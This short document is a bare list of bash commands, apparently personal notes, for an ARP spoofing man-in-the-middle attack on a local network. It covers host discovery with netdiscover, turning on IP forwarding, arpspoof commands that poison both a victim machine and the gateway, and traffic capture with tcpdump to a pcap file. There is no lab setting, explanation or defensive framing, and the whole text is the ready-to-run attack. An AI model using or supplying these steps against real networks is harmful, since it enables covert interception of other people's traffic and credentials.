⁠ bash
ip a
arp -a

netdiscover

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 ⁠

### Terminal 1

⁠ bash
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
 ⁠

### Terminal 2

⁠ bash
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
 ⁠

### Terminal 3

⁠ bash
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap
 ⁠

### EXTRA (recommended)

⁠ bash
wireshark
 ⁠
